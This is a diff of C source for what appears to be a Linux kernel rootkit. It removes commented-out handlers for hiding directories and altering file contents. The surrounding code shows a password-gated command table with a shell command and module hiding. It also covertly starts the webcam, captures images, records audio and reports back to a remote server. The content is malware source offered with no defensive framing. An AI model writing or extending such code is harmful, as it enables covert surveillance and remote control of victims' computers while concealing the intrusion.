@@ -35,17 +35,11 @@ int getshell_handler(char *args);
 int killcom_handler(char *args);
 int hide_module_handler(char *args);
 int unhide_module_handler(char *args);
-int hide_dir_handler(char *args);
-int show_dir_handler(char *args);
-int list_dir_handler(char *args);
 int help_handler(char *args);
 int start_webcam_handler(char *args);
 int capture_image_handler(char *args);
 int start_microphone_handler(char *args);
 int play_audio_handler(char *args);
-int modify_file_handler(char *args);
-int unmodify_file_handler(char *args);
-int list_mods_handler(char *args);
 
 static struct command rootkit_commands_array[] = {
     { "connect", 7, "unlock access to rootkit. Usage: connect [password]", 50, connect_handler },
@@ -286,54 +280,6 @@ int unhide_module_handler(char *args) {
     return ret_code;
 }
 
-/*
-int hide_dir_handler(char *args) {
-    char *dir = args;
-    dir += strspn(dir, " \t");
-    dir[strcspn(dir, "\n")] = '\0';
-    int ret_code = add_hidden_dir(dir);
-    if (ret_code < 0) {
-        ERR_MSG("hide_dir_handler: failed to hide directory or file\n");
-    }
-    else {
-        DBG_MSG("hide_dir_handler: directory or file %s hidden\n", dir);
-    }
-    return ret_code;
-}
-
-int show_dir_handler(char *args) {
-    char *dir = args;
-    dir += strspn(dir, " \t");
-    dir[strcspn(dir, "\n")] = '\0';
-    int ret_code = remove_hidden_dir(dir);
-    if (ret_code < 0) {
-        ERR_MSG("show_dir_handler: failed to unhide directory or file\n");
-    }
-    else {
-        DBG_MSG("show_dir_handler: directory or file %s unhidden\n", dir);
-    }
-    return ret_code;
-}
-
-int list_dir_handler(char *args) {
-    char *buf;
-    int len;
-
-    buf = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
-    if (!buf)
-        return -ENOMEM;
-
-    len = list_hidden_dirs(buf, STD_BUFFER_SIZE);
-    if (len <= 0)
-        send_to_server("No hidden directoriesor files\n");
-    else
-        send_to_server(buf);
-
-    kfree(buf);
-    return 0;
-}
-*/
-
 // Command to start the webcam and capture an image
 int start_webcam_handler(char *args) {
     DBG_MSG("start_webcam_handler: starting webcam to capture an image\n");
@@ -407,71 +353,3 @@ int play_audio_handler(char *args) {
     send_to_server("Audio played\n");
     return SUCCESS;
 }
-/*
-int modify_file_handler(char *args) {
-
-    // Parameters
-    char *path;
-    int hide_line = 0;
-    char *hide_substr = NULL;
-    char *replace_src = NULL;
-    char *replace_dst = NULL;
-
-    // Parsing
-    char *token, *pair;
-
-    // Get the first token
-    path = strsep(&args, " ");
-    if (!path || path[0] != '/') {
-        send_to_server("Usage: modify /full/path [hide_line=N] [hide_substr=TXT] [replace=SRC:DST]\n");
-        return -EINVAL;
-    }
-
-    while (args && *args) {
-        token = strsep(&args, " ");
-        if (strncmp(token, "hide_line=", 10) == 0) {
-            hide_line = simple_strtol(token + 10, NULL, 10);
-        }
-        else if (strncmp(token, "hide_substr=", 12) == 0) {
-            hide_substr = kstrdup(token + 12, GFP_KERNEL);
-            if (!hide_substr)
-                return -ENOMEM;
-        }
-        else if (strncmp(token, "replace=", 8) == 0) {
-            pair = token + 8;
-            replace_src = kstrdup(pair, GFP_KERNEL);
-            if (!replace_src)
-                return -ENOMEM;
-            replace_dst = strsep(&pair, ":");
-            if (!pair) {
-                kfree(replace_src);
-                send_to_server("Usage: replace=SRC:DST\n");
-                return -EINVAL;
-            }
-            replace_dst = kstrdup(pair, GFP_KERNEL);
-            if (!replace_dst) {
-                kfree(replace_src);
-                return -ENOMEM;
-            }
-        }
-    }
-
-    return add_modified_file(path, hide_line, hide_substr, replace_src, replace_dst);
-}
-
-int unmodify_file_handler(char *args) {
-    return remove_modified_file(args);
-}
-
-int list_mods_handler(char *args) {
-    char *buf = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
-    if (!buf)
-        return -ENOMEM;
-    int len = list_modified_files(buf, STD_BUFFER_SIZE);
-    if (len > 0)
-        send_to_server(buf);
-    else
-        send_to_server("No modifications defined\n");
-    kfree(buf);
-    return 0;
-}*/
